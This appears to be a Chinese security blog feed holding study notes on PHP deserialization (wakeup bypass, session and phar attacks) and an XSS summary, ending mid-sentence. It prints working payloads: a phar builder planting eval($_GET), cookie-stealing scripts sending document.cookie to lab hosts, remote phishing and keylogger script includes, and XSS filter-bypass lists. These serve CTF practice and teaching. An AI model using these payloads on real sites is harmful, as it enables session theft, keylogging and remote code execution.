title="wakeup绕过"></a>wakeup绕过</h1><p><strong>漏洞产生的原因：如果存在wakeup方法，调用unserialize()前则先调用weakup方法，但是序列化字符串中表示对象属性个数的值大于真实的属性个数时，会跳过__weakup()执行。</strong></p><p><strong>有版本限制</strong></p><p>例题：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-40.png"></p><p>绕过思路：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-41.png"></p><p>payload:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode">O:<span class="hljs-number">+6</span>:<span class="hljs-string">&quot;secret&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;&#125;<br>需要先url编码<br><br>?cmd=O<span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-meta">%</span><span class="hljs-number">2</span>B<span class="hljs-number">6</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-meta">%</span><span class="hljs-number">22</span>secret<span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-meta">%</span><span class="hljs-number">7</span>Bs<span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-number">4</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-meta">%</span><span class="hljs-number">22</span>file<span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>Bs<span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-meta">%</span><span class="hljs-number">22</span>flag.php<span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>B<span class="hljs-meta">%</span><span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><h1 id="引用的利用方式"><a href="#引用的利用方式" class="headerlink" title="引用的利用方式"></a>引用的利用方式</h1><p><strong>&amp;符号的利用</strong></p><p>感觉有点像c里的取地址符，指针</p><p>比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$a</span> = new <span class="hljs-built_in">test</span>();<br><span class="hljs-variable">$a</span>-&gt;enter = &amp;<span class="hljs-variable">$a</span>-&gt;secret;<br></code></pre></td></tr></table></figure><p>这里就相当于a对象中的成员属性enter的值引用了a对象中成员属性secret的值，所以当secret的值改变的时候，enter依然与enter相同</p><p>例题：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-42.png"></p><p>payload构造：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-43.png"></p><h1 id="session反序列化漏洞"><a href="#session反序列化漏洞" class="headerlink" title="session反序列化漏洞"></a>session反序列化漏洞</h1><p><strong>session</strong></p><p>当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为&#x2F;tmp）。</p><p>存取数据的格式有多种，常用的有三种</p><p>漏洞产生：写入格式和读取格式不一致</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-44.png"></p><p>当网站序列化并存储session，与反序列化并读取session的方式不同，就可能导致session反序列化漏洞的产生</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-45.png"></p><h2 id="session反序列化漏洞例题"><a href="#session反序列化漏洞例题" class="headerlink" title="session反序列化漏洞例题"></a>session反序列化漏洞例题</h2><p>题目：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-46.png"></p><p>这题思路就是我们要触发__wakeup魔术方法才能得到flag，但是页面没有反序列化来触发，所以可以利用hint.php文件<br>因为hint.php声明的session存储格式为php_serialize，而题目使用的是默认的php格式，所以默认页面以php格式处理session读取时就会触发漏洞</p><p>构造思路：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-47.png"></p><h1 id="phar反序列化漏洞"><a href="#phar反序列化漏洞" class="headerlink" title="phar反序列化漏洞"></a>phar反序列化漏洞</h1><h2 id="什么是phar"><a href="#什么是phar" class="headerlink" title="什么是phar"></a>什么是phar</h2><p>JAR是开发java程序一个引用，包括所有的可执行、可访问的文件，都打包进了一个JAR文件里，使得部署过程十分简单</p><p><code>**like a java JAR,but for PHP**</code></p><p><strong>PHAR（”Php ARchive”）是PHP里类似于JAR的一种打包文件。</strong></p><p><strong>对于PHP 5.3 或更高版本，Phar后缀文件时默认开启支持的，可以直接使用它。</strong></p><p><strong>文件包含：phar伪协议，可读取 .phar文件</strong></p><hr><h2 id="phar结构"><a href="#phar结构" class="headerlink" title="phar结构"></a>phar结构</h2><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-48.png"></p><p><strong>第一部分</strong>：</p><p><strong>stub phar 文件标识，格式为 xxx&lt;?php xxx; __HALT_COMPILER();?&gt;; （头部信息）</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-49.png"></p><hr><p><strong>第二部分：重点关注</strong></p><p><strong>manifest 压缩文件的属性等信息，以序列化存储;</strong></p><p><strong>phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar:&#x2F;&#x2F;伪协议解析phar文件时就会将数据反序列化</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-50.png"></p><hr><p><strong>content 压缩文件的信息</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-51.png"></p><hr><p><strong>signature签名，放在文件末尾</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-52.png"></p><hr><h2 id="phar漏洞原理"><a href="#phar漏洞原理" class="headerlink" title="phar漏洞原理"></a>phar漏洞原理</h2><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-53.png"></p><h2 id="phar文件构造模版"><a href="#phar文件构造模版" class="headerlink" title="phar文件构造模版"></a>phar文件构造模版</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    所需代码；<br>    &#125;<br>    <br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<span class="hljs-comment">//删除之前的test.phar文件（如果有）</span><br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;test.phar&quot;</span>); <span class="hljs-comment">//创建一个phar对象，文件名必须以phar为后缀</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<span class="hljs-comment">//开始写文件</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//写入stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$o</span> -&gt; output=<span class="hljs-string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;<span class="hljs-comment">//写入要执行的命令，给output成员属性赋值</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;text.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后在有反序列化漏洞的页面构造payload</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">?<span class="hljs-keyword">filename</span>=phar://test.phar<span class="hljs-variable">&amp;a</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-54.png"></p><p>命令成功执行</p><hr><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-55.png"></p><h2 id="phar使用条件"><a href="#phar使用条件" class="headerlink" title="phar使用条件"></a>phar使用条件</h2><ol><li><strong>phar文件能上传到服务器端；（后缀名不论，只要上传上去就行）</strong></li><li><strong>要有可用反序列化魔术方法作为跳板；</strong></li><li><strong>要有文件操作函数，如file_exists()，fopen()，file_get_contents()</strong></li><li><strong>文件操作函数参数可控，且：、&#x2F;、phar等特殊字符没有被过滤</strong></li></ol><h2 id="phar反序列化例题"><a href="#phar反序列化例题" class="headerlink" title="phar反序列化例题"></a>phar反序列化例题</h2><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-56.png"></p><p>题目解析：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-57.png"></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-58.png"></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-59.png"></p><p><strong>然后修改后缀为jpg上传（因为过滤了phar后缀）</strong></p><p><strong>最后使用md5_file函数和phar伪协议去读取我们上传的文件就能触发反序列化了。</strong></p><p><strong>payload</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">post</span>方法<br><span class="hljs-keyword">file</span>=phar:<span class="hljs-comment">//upload/test.jpg</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> PHP反序列化漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss漏洞总结</title>
      <link href="/2025/02/12/xss%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2025/02/12/xss%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="xss漏洞"><a href="#xss漏洞" class="headerlink" title="xss漏洞"></a>xss漏洞</h1><h2 id="漏洞介绍："><a href="#漏洞介绍：" class="headerlink" title="漏洞介绍："></a>漏洞介绍：</h2><p>XSS 攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为 XSS，XSS 是一种在 web 应用中的计算机安全漏洞，它允许恶意 web 用户将代码植入到 web 网站里面，供给其它用户访问，当用户访问到有恶意代码的网页就会产生 xss 攻击。</p><h2 id="漏洞危害："><a href="#漏洞危害：" class="headerlink" title="漏洞危害："></a>漏洞危害：</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs">1、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号<br>2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力<br>3、盗窃企业重要的具有商业价值的资料<br>4、非法转账<br>5、强制发送电子邮件<br>6、网站挂马<br>7、控制受害者机器向其它网站发起攻击<br></code></pre></td></tr></table></figure><h2 id="如何防御："><a href="#如何防御：" class="headerlink" title="如何防御："></a>如何防御：</h2><p>对输入的参数和URL进行过滤，对输出的参数进行编码，使脚本无法正常执行。</p><h1 id="xss漏洞类型："><a href="#xss漏洞类型：" class="headerlink" title="xss漏洞类型："></a>xss漏洞类型：</h1><h2 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h2><p>反射性XSS不是持久化的，攻击脚本不会储存在数据库中，而是构建在链接中，需要欺骗用户进行点击，用户再点击了包含恶意代码的链接后，服务器接收到请求并处理，把带有恶意脚本的发送给用户浏览器，浏览器对恶意脚本进行解析，触发攻击。</p><h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><p>储存型xss，持久化，内容储存在数据库中，如评论、留言、发表文章的地方，对于传输来的数据过滤不严格，那么就可以将恶意代码插入到数据库中，用户访问该页面时，没有进行编码过滤输出到浏览器上，就会触发代码执行，造成 xss 攻击。</p><h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><p>DOM 型 XSS 其实是一种特殊类型的反射型 XSS，它是基于 DOM 文档对象模型的一种漏洞。一般不与后台服务端交互</p><h1 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h1><h2 id="1-盗取cookie："><a href="#1-盗取cookie：" class="headerlink" title="1.盗取cookie："></a>1.盗取cookie：</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&#x27;http://192.168.0.15/pikachu/pkxss/xcookie/cookie.php?cookie=&#x27;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><h2 id="2-构造页面跳转："><a href="#2-构造页面跳转：" class="headerlink" title="2.构造页面跳转："></a>2.构造页面跳转：</h2><p><code>&lt;script&gt;location=&#39;https://www.hacker.com&#39;&lt;/script&gt;</code></p><h2 id="3-构造获取cookie并发送到远程主机："><a href="#3-构造获取cookie并发送到远程主机：" class="headerlink" title="3.构造获取cookie并发送到远程主机："></a>3.构造获取cookie并发送到远程主机：</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&#x27;http://127.0.0.1/test/cookie.phpcookie=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="4-xss钓鱼演示："><a href="#4-xss钓鱼演示：" class="headerlink" title="4.xss钓鱼演示："></a>4.xss钓鱼演示：</h2><p>钓鱼攻击利用页面</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://192.168.32.1/pikachu-master/pkxss/xfish/fish.php&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="5-xss获取键盘记录"><a href="#5-xss获取键盘记录" class="headerlink" title="5.xss获取键盘记录"></a>5.xss获取键盘记录</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://192.168.32.1/pikachu-master/pkxss/rkeypress/rk.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h1><h2 id="常见注入点"><a href="#常见注入点" class="headerlink" title="常见注入点"></a>常见注入点</h2><ul><li>输入框</li><li>留言板</li><li>URL中可传参数的变量</li></ul><h2 id="常用事件："><a href="#常用事件：" class="headerlink" title="常用事件："></a>常用事件：</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">onclick</span>: 点击触发 --（&lt;img src=x onclick=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&gt;）<br><span class="hljs-attr">onerror</span>: 当 src 加载不出来时触发 --（&lt;img src=x onerror=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&gt;）<br><span class="hljs-attr">onload</span>: 当 src 加载完毕触发--（&lt;img src=x onload=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&gt;）<br>onmouseover：鼠标指针移动到图片后触发--（&lt;img src=x onmouseover=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&gt;）<br><span class="hljs-attr">onmousemove</span>: 鼠标指针移到指定的元素后触发--（&lt;img src=x onmousemove=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>) &gt;）<br><span class="hljs-attr">onmouseout</span>: 鼠标指针划出指定元素触发--（&lt;img src=x onmouseout=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>) &gt;）<br><span class="hljs-attr">onfocus</span>: 当 input 输入框获取焦点时触发--（&lt;input onfocus=<span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>) autofocus&gt;）<br></code></pre></td></tr></table></figure><h2 id="常用属性："><a href="#常用属性：" class="headerlink" title="常用属性："></a>常用属性：</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">src<br>action<br>href<br>data<br>content<br></code></pre></td></tr></table></figure><h2 id="常见标签语句"><a href="#常见标签语句" class="headerlink" title="常见标签语句"></a>常见标签语句</h2><h3 id="script标签"><a href="#script标签" class="headerlink" title="script标签"></a>script标签</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/xss/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(123)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="a标签"><a href="#a标签" class="headerlink" title="a标签"></a>a标签</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;test&lt;/a&gt;<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onfocus</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span> <span class="hljs-attribute">autofocus</span>=<span class="hljs-string">&quot;&quot;</span>&gt;xss&lt;/a&gt;<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onclick</span>=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;xss&lt;/a&gt;<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onmouseover</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;xss&lt;/a&gt;<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onmouseout</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;xss&lt;/a&gt;<br></code></pre></td></tr></table></figure><h3 id="iframe标签"><a href="#iframe标签" class="headerlink" title="iframe标签"></a>iframe标签</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;iframe <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;test&lt;/iframe&gt;<br>&lt;iframe <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;alert(document.cookie)&quot;</span>&gt;&lt;/iframe&gt;<br>&lt;iframe <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/iframe&gt;<br>&lt;iframe <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;base64,YWxlcnQoJ3hzcycpOw==&quot;</span>&gt;&lt;/iframe&gt;<br>&lt;iframe <span class="hljs-attribute">onmouseover</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/iframe&gt;<br>&lt;iframe <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=eval(&quot;alert(1)&quot;)&gt;<br>&lt;img <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onmouseover</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onmouseout</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="input标签"><a href="#input标签" class="headerlink" title="input标签"></a>input标签</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;<br>&lt;input <span class="hljs-attribute">onfocus</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;<br>&lt;input <span class="hljs-attribute">onfocus</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span> <span class="hljs-attribute">autofocus</span>=<span class="hljs-string">&quot;&quot;</span>&gt;<br>&lt;input <span class="hljs-attribute">onmouseover</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;<br>&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attribute">onkeydown</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/input&gt;<br>&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attribute">onkeypress</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/input&gt;<br>&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attribute">onkeydown</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/input&gt;<br></code></pre></td></tr></table></figure><h3 id="object标签"><a href="#object标签" class="headerlink" title="object标签"></a>object标签</h3><p><strong>这个需要借助 data 伪协议和 base64 编码来实现绕过</strong></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">&lt;<span class="hljs-keyword">object</span> <span class="hljs-keyword">data</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;</span>&gt;&lt;/<span class="hljs-keyword">object</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="p标签"><a href="#p标签" class="headerlink" title="p标签"></a>p标签</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">onmouseout</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">onmouseup</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="其他标签"><a href="#其他标签" class="headerlink" title="其他标签"></a>其他标签</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;audio <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(1)&gt;<br>&lt;video <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=alert(1)&gt;<br>&lt;button <span class="hljs-attribute">onclick</span>=alert(1)&gt;<br>&lt;form <span class="hljs-attribute">method</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">action</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onmouseover</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;input <span class="hljs-attribute">type</span>=submit&gt;&lt;/form&gt;<br>&lt;body <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/body&gt;<br></code></pre></td></tr></table></figure><h1 id="xss常见绕过"><a href="#xss常见绕过" class="headerlink" title="xss常见绕过"></a>xss常见绕过</h1><h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ScRipT</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">scRiPt</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>比如将 <code>script</code> 